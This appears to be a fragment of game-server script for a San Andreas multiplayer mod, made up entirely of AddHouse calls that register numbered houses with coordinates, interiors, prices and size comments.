	AddHouse(1405, -2513.513427, 867.583007, 57.742187, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1406);//Big house
	AddHouse(1406, -2513.507568, 885.757751, 62.778030, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1407);//Big house
	AddHouse(1407, -2502.948242, 895.241394, 65.258865, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1408);//Big house
	AddHouse(1408, -2471.912841, 895.236511, 63.168357, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1409);//Big house
	AddHouse(1409, -2449.864501, 895.233764, 58.146617, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1410);//Big house
	AddHouse(1410, -2431.361083, 895.237609, 50.545631, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1411);//Big house
	AddHouse(1411, -2412.904785, 895.227661, 45.466762, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1412);//Big house
	AddHouse(1412, -2402.396972, 886.044128, 45.445312, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1413);//Big house
	AddHouse(1413, -2402.410156, 869.185729, 44.203125, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1414);//Big house
	AddHouse(1414, -2402.415527, 849.059692, 40.593750, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1415);//Big house
	AddHouse(1415, -2402.416259, 829.172912, 36.853042, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1416);//Big house
	AddHouse(1416, -2502.780517, 921.363342, 65.239616, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1417);//Big house
	AddHouse(1417, -2472.009277, 921.426208, 63.165920, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1418);//Big house
	AddHouse(1418, -2449.855957, 921.427429, 58.145019, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1419);//Big house
	AddHouse(1419, -2431.419433, 921.427185, 50.578125, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1420);//Big house
	AddHouse(1420, -2412.998046, 921.431457, 45.469009, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1421);//Big house
	AddHouse(1421, -2402.416992, 930.631774, 45.445312, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1422);//Big house
	AddHouse(1422, -2510.932373, 1053.943359, 65.182174, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1423);//Big house
	AddHouse(1423, -2511.712890, 1045.648193, 65.507812, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1424);//Big house
	AddHouse(1424, -2510.924072, 1028.973510, 73.573478, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1425);//Big house
	AddHouse(1425, -2511.775146, 1020.836303, 77.209793, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1426);//Big house
	AddHouse(1426, -2511.767822, 1008.817687, 78.343750, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1427);//Big house
	AddHouse(1427, -2511.737548, 975.749267, 77.224327, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1428);//Big house
	AddHouse(1428, -2510.907470, 967.569946, 73.531074, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1429);//Big house
	AddHouse(1429, -2510.925781, 942.678222, 65.289062, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1430);//Big house
	AddHouse(1430, -2510.902099, 951.130676, 65.611328, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1431); //A small house ;)
	AddHouse(1431, -2511.770507, 987.770751, 78.343750, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1432); //A small house ;)
	AddHouse(1432, -2511.766845, 992.310485, 78.335716, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1433); //A small house ;)
	AddHouse(1433, -2511.766845, 1000.522644, 78.343750, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1434); //A small house ;)
	AddHouse(1434, -2383.036376, 1226.303466, 33.046878, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1435); //A small house ;)
	AddHouse(1435, -2383.138671, 1244.772338, 29.684803, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1436); //A small house ;)
	AddHouse(1436, -2351.141113, 1244.566772, 29.679243, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1437); //A small house ;)
	AddHouse(1437, -2351.137695, 1263.059448, 26.317256, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1438); //A small house ;)
	AddHouse(1438, -2383.139892, 1281.324340, 22.963102, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1439); //A small house ;)
	AddHouse(1439, -2351.136718, 1281.307617, 22.944293, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1440); //A small house ;)
	AddHouse(1440, -2383.140380, 1299.788330, 19.599506, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1441); //A small house ;)
	AddHouse(1441, -2351.136962, 1299.455322, 19.584878, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1442); //A small house ;)
	AddHouse(1442, -2351.148681, 1317.977905, 16.224803, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1443); //A small house ;)
	AddHouse(1443, -2351.139404, 1336.238281, 12.787528, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1444); //A small house ;)
	AddHouse(1444, -2383.109375, 1336.495361, 12.805156, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1445); //A small house ;)
	AddHouse(1445, -2383.139648, 1318.073852, 16.239250, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1446); //A small house ;)
	AddHouse(1446, -2065.849609, 1160.621948, 46.648437, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1447); //A small house ;)
	AddHouse(1447, -2152.405273, 1248.516601, 25.735448, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1448);//Big house
	AddHouse(1448, -1872.076171, 1146.552246, 45.445312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1449); //A small house ;)
	AddHouse(1449, -1872.209106, 1125.251953, 45.445312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1450); //A small house ;)
	AddHouse(1450, -1860.822143, 1115.523437, 45.445312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1451); //A small house ;)
	AddHouse(1451, -1842.223510, 1115.522705, 45.445312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1452); //A small house ;)
	AddHouse(1452, -1820.744140, 1117.300292, 46.445312, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1453);//Big house
	AddHouse(1453, -1831.741821, 1165.843627, 33.686775, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1454);//Big house
	AddHouse(1454, -1852.193481, 1162.212402, 40.943241, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1455);//Big house
	AddHouse(1455, -1915.498657, 1190.545043, 45.452735, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1456); //A small house ;)
	AddHouse(1456, -1929.631347, 1190.544555, 45.445312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1457); //A small house ;)
	AddHouse(1457, -1955.407958, 1190.540771, 45.445312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1458); //A small house ;)
	AddHouse(1458, -1982.412963, 1190.548339, 45.445312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1459); //A small house ;)
	AddHouse(1459, -1997.555175, 1190.548339, 45.445312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1460); //A small house ;)
	AddHouse(1460, -2018.677734, 1194.185668, 45.457439, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1461); //A small house ;)
	AddHouse(1461, -2054.307861, 1194.185302, 45.457439, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1462); //A small house ;)
	AddHouse(1462, -2036.805419, 1197.685791, 46.234375, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1463);//Big house
	AddHouse(1463, -2139.927490, 1190.381591, 55.726562, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1464);//Big house
	AddHouse(1464, 1845.554077, 740.951232, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1465); //A small house ;)
	AddHouse(1465, 1843.995971, 718.777221, 11.468292, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1466); //A small house ;)
	AddHouse(1466, 1844.535034, 690.529907, 11.453125, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1467); //A small house ;)
	AddHouse(1467, 1845.437377, 661.182800, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1468); //A small house ;)
	AddHouse(1468, 2011.414550, 695.186035, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1469); //A small house ;)
	AddHouse(1469, 2013.998291, 650.406311, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1470); //A small house ;)
	AddHouse(1470, 2043.389648, 651.313415, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1471); //A small house ;)
	AddHouse(1471, 2040.762084, 696.094543, 11.453125, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1472); //A small house ;)
	AddHouse(1472, 2069.032714, 696.629699, 11.468292, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1473); //A small house ;)
	AddHouse(1473, 2065.783691, 649.870117, 11.468292, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1474); //A small house ;)
	AddHouse(1474, 2094.041015, 650.408996, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1475); //A small house ;)
	AddHouse(1475, 2091.052734, 695.182067, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1476); //A small house ;)
	AddHouse(1476, 2120.323974, 696.089294, 11.453125, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1477); //A small house ;)
	AddHouse(1477, 2123.339843, 651.312561, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1478); //A small house ;)
	AddHouse(1478, 2122.465087, 731.277343, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1479); //A small house ;)
	AddHouse(1479, 2123.251953, 776.098449, 11.445312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1480); //A small house ;)
	AddHouse(1480, 2094.370605, 775.187438, 11.453125, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1481); //A small house ;)
	AddHouse(1481, 2093.273193, 730.360595, 11.453125, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1482); //A small house ;)
	AddHouse(1482, 2071.599365, 776.633728, 11.460479, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1483); //A small house ;)
	AddHouse(1483, 2065.058837, 729.832092, 11.468292, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1484); //A small house ;)
	AddHouse(1484, 2043.403930, 776.094665, 11.453125, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1485); //A small house ;)
	AddHouse(1485, 2042.362548, 731.269653, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1486); //A small house ;)
	AddHouse(1486, 2014.144897, 775.193237, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1487); //A small house ;)
	AddHouse(1487, 2013.198364, 730.358398, 11.453125, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1488); //A small house ;)
	AddHouse(1488, 2169.357421, 772.515930, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1489); //A small house ;)
	AddHouse(1489, 2177.598632, 736.084716, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1490); //A small house ;)
	AddHouse(1490, 2177.160888, 690.350585, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1491); //A small house ;)
	AddHouse(1491, 2205.823974, 736.628662, 11.468292, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1492); //A small house ;)
	AddHouse(1492, 2206.317382, 691.252685, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1493); //A small house ;)
	AddHouse(1493, 2228.235107, 735.202819, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1495); //A small house ;)
	AddHouse(1494, 2228.641601, 689.811706, 11.460479, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1495); //A small house ;)
	AddHouse(1495, 2256.949707, 690.346435, 11.453125, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1496); //A small house ;)
	AddHouse(1496, 2257.488525, 736.110534, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1497); //A small house ;)
	AddHouse(1497, 2258.314453, 655.969360, 11.453125, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1498); //A small house ;)
	AddHouse(1498, 2229.032714, 655.172668, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1499); //A small house ;)
	AddHouse(1499, 2206.327636, 656.625427, 11.468292, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1500); //A small house ;)
	AddHouse(1500, 2178.198974, 655.984558, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1501); //A small house ;)
	AddHouse(1501, 2346.547851, 736.432128, 11.468292, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1502); //A small house ;)
	AddHouse(1502, 2317.022460, 690.358337, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1503); //A small house ;)
	AddHouse(1503, 2346.390625, 691.263671, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1504); //A small house ;)
	AddHouse(1504, 2369.026611, 735.194702, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1505); //A small house ;)
	AddHouse(1505, 2368.538574, 689.804321, 11.460479, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1506); //A small house ;)
	AddHouse(1506, 2396.906494, 690.342407, 11.453125, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1507); //A small house ;)
	AddHouse(1507, 2398.234375, 736.096618, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1508); //A small house ;)
	AddHouse(1508, 2397.645263, 656.102722, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1509); //A small house ;)
	AddHouse(1509, 2368.372070, 655.207580, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1510); //A small house ;)
	AddHouse(1510, 2346.020751, 656.637512, 11.460479, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1511); //A small house ;)
	AddHouse(1511, 2317.945800, 656.098571, 11.453125, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1512); //A small house ;)
	AddHouse(1512, 2450.271484, 662.649536, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1513); //A small house ;)
	AddHouse(1513, 2450.804931, 714.366027, 11.468292, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1514); //A small house ;)
	AddHouse(1514, 2450.265625, 742.490722, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1515); //A small house ;)
	AddHouse(1515, 2532.346679, 750.096008, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1516); //A small house ;)
	AddHouse(1516, 2532.216064, 742.544006, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1517); //A small house ;)
	AddHouse(1517, 2532.402587, 742.541687, 14.739588, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1518); //A small house ;)
	AddHouse(1518, 2532.264648, 750.084350, 14.739588, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1519); //A small house ;)
	AddHouse(1519, 2526.160888, 742.551086, 14.739588, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1520); //A small house ;)
	AddHouse(1520, 2525.977783, 750.090881, 14.739588, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1521); //A small house ;)
	AddHouse(1521, 2540.043701, 719.414978, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1522); //A small house ;)
	AddHouse(1522, 2532.662841, 719.403686, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1523); //A small house ;)
	AddHouse(1523, 2532.511474, 713.323791, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1524); //A small house ;)
	AddHouse(1524, 2540.043701, 713.191589, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1525); //A small house ;)
	AddHouse(1525, 2525.954101, 750.089782, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1526); //A small house ;)
	AddHouse(1526, 2526.088867, 742.541625, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1527); //A small house ;)
	AddHouse(1527, 2540.058837, 719.561645, 14.739588, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1528); //A small house ;)
	AddHouse(1528, 2532.514160, 719.554504, 14.739588, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1529); //A small house ;)
	AddHouse(1529, 2540.059082, 713.282531, 14.739588, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1530); //A small house ;)
	AddHouse(1530, 2532.514648, 713.196166, 14.739588, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1531); //A small house ;)
	AddHouse(1531, 2579.081787, 719.541259, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1532); //A small house ;)
	AddHouse(1532, 2571.555664, 719.546813, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1533); //A small house ;)
	AddHouse(1533, 2579.082031, 713.370727, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1534); //A small house ;)
	AddHouse(1534, 2571.552490, 713.148193, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1535); //A small house ;)
	AddHouse(1535, 2579.083496, 713.221191, 14.739588, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1536); //A small house ;)
	AddHouse(1536, 2571.544921, 713.145141, 14.739588, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1537); //A small house ;)
	AddHouse(1537, 2579.078857, 719.583679, 14.739588, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1538); //A small house ;)
	AddHouse(1538, 2571.528320, 719.558959, 14.739588, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1539); //A small house ;)
	AddHouse(1539, 2621.059814, 719.572753, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1540); //A small house ;)
	AddHouse(1540, 2621.045654, 713.198181, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1541); //A small house ;)
	AddHouse(1541, 2613.506103, 713.115905, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1542); //A small house ;)
	AddHouse(1542, 2613.507568, 719.360473, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1543); //A small house ;)
	AddHouse(1543, 2613.531738, 719.409973, 14.739588, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1544); //A small house ;)
	AddHouse(1544, 2621.052734, 719.572021, 14.739588, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1545); //A small house ;)
	AddHouse(1545, 2613.509277, 713.261413, 14.739588, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1546); //A small house ;)
	AddHouse(1546, 2621.057861, 713.331604, 14.739588, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1547); //A small house ;)
	AddHouse(1547, 2660.082763, 713.330810, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1548); //A small house ;)
	AddHouse(1548, 2652.529785, 713.134887, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1549); //A small house ;)
	AddHouse(1549, 2652.532470, 719.393432, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1550); //A small house ;)
	AddHouse(1550, 2660.081542, 719.612121, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1551); //A small house ;)
	AddHouse(1551, 2660.081542, 713.274780, 14.739588, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1552); //A small house ;)
	AddHouse(1552, 2652.544677, 713.246887, 14.739588, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1553); //A small house ;)
	AddHouse(1553, 2652.529052, 719.472900, 14.739588, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1554); //A small house ;)
	AddHouse(1554, 2660.081054, 719.501098, 14.739588, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1555); //A small house ;)
	AddHouse(1555, 2666.504150, 750.096252, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1556); //A small house ;)
	AddHouse(1556, 2666.445556, 742.549987, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1557); //A small house ;)
	AddHouse(1557, 2660.162841, 750.085632, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1558); //A small house ;)
	AddHouse(1558, 2660.293701, 742.544555, 10.820312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1559); //A small house ;)
	AddHouse(1559, 2666.487304, 750.098510, 14.739588, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1560); //A small house ;)
	AddHouse(1560, 2660.162109, 750.091674, 14.739588, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1561); //A small house ;)
	AddHouse(1561, 2660.373779, 742.546081, 14.739588, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1562); //A small house ;)
	AddHouse(1562, 2666.410156, 750.094177, 14.739588, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1563); //A small house ;)
	AddHouse(1563, 2666.510009, 742.553100, 14.739588, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1564); //A small house ;)
	AddHouse(1564, 784.258178, 1954.328735, 5.707432, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1565); //A small house ;)
	AddHouse(1565, 777.957946, 1937.817260, 5.487823, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1566); //A small house ;)
	AddHouse(1566, 790.001098, 1973.929687, 5.738682, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1567); //A small house ;)
	AddHouse(1567, 766.990844, 1989.484497, 5.335937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1568); //A small house ;)
	AddHouse(1568, 753.762268, 1973.255249, 5.699619, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1569); //A small house ;)
	AddHouse(1569, 767.692687, 2007.610717, 6.066807, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1570); //A small house ;)
	AddHouse(1570, 793.478027, 1991.774169, 5.793369, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1571); //A small house ;)
	AddHouse(1571, 755.636596, 1958.788574, 5.460802, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1572); //A small house ;)
	AddHouse(1572, 1030.808837, 1848.110839, 11.468292, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1573); //A small house ;)
	AddHouse(1573, 1030.346313, 1876.471435, 11.468750, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1574); //A small house ;)
	AddHouse(1574, 983.985290, 1878.782592, 11.468292, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1575); //A small house ;)
	AddHouse(1575, 985.412780, 1901.094726, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1576); //A small house ;)
	AddHouse(1576, 1029.365600, 1905.738281, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1577); //A small house ;)
	AddHouse(1577, 1030.805541, 1928.095825, 11.468292, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1578); //A small house ;)
	AddHouse(1578, 984.705078, 1930.371459, 11.468750, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1579); //A small house ;)
	AddHouse(1579, 983.973999, 1978.467041, 11.468292, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1580); //A small house ;)
	AddHouse(1580, 1030.268066, 1976.238159, 11.468750, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1581); //A small house ;)
	AddHouse(1581, 985.412597, 2000.498046, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1582); //A small house ;)
	AddHouse(1582, 1029.344848, 2005.806152, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1583); //A small house ;)
	AddHouse(1583, 984.521423, 2030.225097, 11.468750, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1584); //A small house ;)
	AddHouse(1584, 1030.808837, 2028.028198, 11.468292, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1585); //A small house ;)
	AddHouse(1585, 1083.976928, 2031.703369, 11.468292, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1586); //A small house ;)
	AddHouse(1586, 1085.409423, 2001.009399, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1587); //A small house ;)
	AddHouse(1587, 1084.508789, 1976.532836, 11.468750, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1588); //A small house ;)
	AddHouse(1588, 930.805297, 1928.155639, 11.468292, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1589); //A small house ;)
	AddHouse(1589, 885.413940, 1980.459472, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1590); //A small house ;)
	AddHouse(1590, 930.807312, 2027.877441, 11.468292, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1591); //A small house ;)
	AddHouse(1591, 885.570312, 2047.155395, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1592); //A small house ;)
	AddHouse(1592, 957.062072, 2270.274658, 11.468750, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1593); //A small house ;)
	AddHouse(1593, 986.434814, 2271.251220, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1594); //A small house ;)
	AddHouse(1594, 985.479858, 2314.508300, 11.460937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1595); //A small house ;)
	AddHouse(1595, 1032.419189, 2316.641601, 11.468292, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1596); //A small house ;)
	AddHouse(1596, 984.469848, 2343.733398, 11.468750, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1597); //A small house ;)
	AddHouse(1597, 1225.896362, 2584.662109, 10.820312, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1598);//Big house
	AddHouse(1598, 1223.046386, 2616.832275, 10.826543, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1599);//Big house
	AddHouse(1599, 1265.508056, 2609.611083, 10.820312, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1600);//Big house
	AddHouse(1600, 1284.743774, 2610.162353, 10.820312, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1601);//Big house
	AddHouse(1601, 1315.896362, 2524.913330, 10.820312, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1602);//Big house
	AddHouse(1602, 1269.633300, 2554.047851, 10.826543, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1603);//Big house
	AddHouse(1603, 1271.890991, 2564.463134, 10.820312, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1604);//Big house
	AddHouse(1604, 1313.590209, 2610.171875, 11.298933, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1605);//Big house
	AddHouse(1605, 1325.535156, 2567.517089, 10.820312, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1606);//Big house
	AddHouse(1606, 1344.745605, 2609.640136, 11.054918, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1607); //A small house ;)
	AddHouse(1607, 1349.296020, 2567.856445, 10.820312, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1608);//Big house
	AddHouse(1608, 1359.774291, 2565.430419, 10.826543, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1609);//Big house
	AddHouse(1609, 1408.173828, 2524.810791, 10.820312, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1610);//Big house
	AddHouse(1610, 1363.184936, 2525.597900, 10.820312, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1611);//Big house
	AddHouse(1611, 1366.100952, 2549.073242, 10.820312, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1612);//Big house
	AddHouse(1612, 1408.732177, 2549.529785, 10.983260, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1613);//Big house
	AddHouse(1613, 1441.675903, 2567.688964, 10.820312, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1614);//Big house
	AddHouse(1614, 1451.242309, 2565.607666, 10.826543, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1615);//Big house
	AddHouse(1615, 1454.104980, 2525.965332, 10.820312, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1616);//Big house
	AddHouse(1616, 1500.027954, 2535.496582, 10.820312, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1617);//Big house
	AddHouse(1617, 1503.089599, 2567.709960, 10.820312, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1618);//Big house
	AddHouse(1618, 1515.849609, 2610.178710, 11.298933, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 1619); //A small house ;)
	AddHouse(1619, 1513.355224, 2565.437500, 10.826543, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1620);//Big house
	AddHouse(1620, 1551.377807, 2567.497558, 10.820312, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1621);//Big house
	AddHouse(1621, 1564.605834, 2565.439697, 10.826543, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1622);//Big house
	AddHouse(1622, 1596.523071, 2567.712158, 10.820312, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 1623);//Big house
